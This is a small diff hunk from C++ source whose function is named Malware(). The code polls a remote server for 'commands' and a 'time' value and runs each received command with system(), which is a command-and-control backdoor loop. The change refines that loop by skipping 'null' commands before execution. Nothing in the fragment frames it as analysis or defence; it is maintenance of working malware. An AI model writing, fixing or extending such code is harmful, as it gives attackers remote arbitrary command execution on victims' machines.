@@ -117,7 +117,7 @@ void Malware()
     {
       string command = DeserializeJson("commands",HttpGet(url,urlActionCommand));
       string timeStr = DeserializeJson("time",HttpGet(url,urlActionCommand));
-      if(command != "error" && timeStr != "error")
+      if(command != "error" && command != "null" && timeStr != "error")
       {
         int time = stoi(timeStr);
         system(command.c_str());
